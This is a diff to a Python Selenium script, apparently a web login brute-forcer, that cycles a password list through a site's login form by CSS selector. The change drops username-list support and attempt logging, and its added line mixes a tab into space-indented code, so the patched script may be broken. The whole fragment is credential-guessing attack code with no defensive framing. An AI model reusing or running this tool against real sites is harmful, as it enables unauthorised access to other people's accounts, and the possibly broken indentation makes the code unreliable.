@@ -98,12 +98,6 @@ def brutes(username, passlist, username_selector, password_selector, login_btn_s
     count = 0
     with open(passlist, 'r') as file:
         f = file.readlines()
-    if use_list:
-        with open(username, 'r') as file2:
-            users = file2.readlines()
-    else:
-        users = username
-        print(len(users))
     optionss = webdriver.ChromeOptions()
     optionss.add_argument("--disable-popup-blocking")
     optionss.add_argument("--disable-extensions")
@@ -128,9 +122,8 @@ def brutes(username, passlist, username_selector, password_selector, login_btn_s
                             print ('------------------------')
                             count += 1
             else:
+            	users = username
                 for line in f:
-                    print(f'The Current user is: {users}')
-                    print(f'The currnet password is: {line}')
                     browser.get(website)
                     wait.until(EC.presence_of_element_located((By.CSS_SELECTOR, login_btn_selector)))
                     Sel_user = browser.find_element_by_css_selector(username_selector) #Finds Selector
